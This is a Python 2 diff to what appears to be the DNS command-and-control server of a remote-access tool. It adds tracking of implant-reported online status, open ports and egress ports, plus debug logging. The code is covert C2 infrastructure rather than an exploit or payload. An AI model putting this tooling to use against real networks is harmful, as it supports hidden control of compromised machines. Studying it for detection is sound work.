@@ -33,6 +33,9 @@ class Session(object):
         self._timeout = timeout
         self.system_info = None
         self.system_status = None
+        self.online_status = None
+        self.open_ports = {}
+        self.egress_ports = set()
         self.commands = commands
         self.last_nonce = None
         self.last_qname = None
@@ -350,7 +353,7 @@ class DnsCommandServerHandler(BaseResolver):
             return [Policy(self.interval, self.kex), Poll()]
 
         elif isinstance(command, Ack) and (session is None):
-            return [Ack()]
+            pass
 
         elif isinstance(command, Exit):
             if session and session.system_info:
@@ -373,6 +376,20 @@ class DnsCommandServerHandler(BaseResolver):
             commands = session.commands
             return commands
 
+        elif isinstance(command, OnlineStatus) and session is not None:
+            session.online_status = command.get_dict()
+
+        elif isinstance(command, ConnectablePort) and session is not None:
+            if not command.ip in session.open_ports:
+                session.open_ports[command.ip] = set()
+
+            for port in command.ports:
+                session.open_ports[command.ip].add(port)
+
+        elif isinstance(command, PortQuizPort) and session is not None:
+            for port in command.ports:
+                session.egress_ports.add(port)
+
         elif isinstance(command, Ack) and (session is not None):
             if session.system_info:
                 self.on_keep_alive(session.system_info)
@@ -381,11 +398,9 @@ class DnsCommandServerHandler(BaseResolver):
                 logging.info('ACK: invalid amount of commands: {} > {}'.format(
                     command.amount, len(session.commands)))
             session.commands = session.commands[command.amount:]
-            return [Ack()]
 
         elif isinstance(command, SystemInfo) and session is not None:
             session.system_info = command.get_dict()
-            return [Ack()]
 
         elif isinstance(command, Kex):
             with self.lock:
@@ -404,8 +419,16 @@ class DnsCommandServerHandler(BaseResolver):
                 logging.debug('dnscnc:kex:key={}'.format(binascii.b2a_hex(key[0])))
 
             return [Kex(response)]
+        elif isinstance(command, PortQuizPort):
+            logging.debug('dnscnc:portquiz: {}'.format(command))
+        elif isinstance(command, ConnectablePort):
+            logging.debug('dnscnc:connectable: {}'.format(command))
+        elif isinstance(command, OnlineStatus):
+            logging.debug('dnscnc:online-status: {}'.format(command))
         else:
             return [Error('NO_POLICY')]
+
+        return [Ack()]
 
     def resolve(self, request, handler):
         if request.q.qtype != QTYPE.A:
@@ -440,9 +463,12 @@ class DnsCommandServerHandler(BaseResolver):
                     pass
                 except Exception as e:
                     logging.exception('DNS request forwarding failed')
+            else:
+                logging.debug('DNSCNC: Bad domain: {} (suffix={})'.format(qname, self.domain))
 
             reply.header.rcode = RCODE.NXDOMAIN
             return reply
+
 
         responses = []
 
@@ -474,12 +500,15 @@ class DnsCommandServerHandler(BaseResolver):
         except DnsCommandServerException as e:
             nonce = e.nonce
             responses = [e.error, Policy(self.interval, self.kex), Poll()]
+            logging.debug('dnscnc: Server Error: {}'.format(e))
 
         except ParcelInvalidCrc as e:
             responses = [e.error]
+            logging.debug('dnscnc: Invalid CRC')
 
         except DnsNoCommandServerException:
             reply.header.rcode = RCODE.NXDOMAIN
+            logging.debug('dnscnc: No CNC Exception')
             return reply
 
         except DnsPingRequest, e:
@@ -490,10 +519,13 @@ class DnsCommandServerHandler(BaseResolver):
                 a.rname = qname
                 reply.add_answer(a)
 
+            logging.debug('dnscnc:ping request:{}'.format(i))
             return reply
 
-        except TypeError:
+        except TypeError, e:
             # Usually - invalid padding
+            logging.debug('dnscnc:invalid padding')
+            logging.exception(e)
             reply.header.rcode = RCODE.NXDOMAIN
             return reply
 
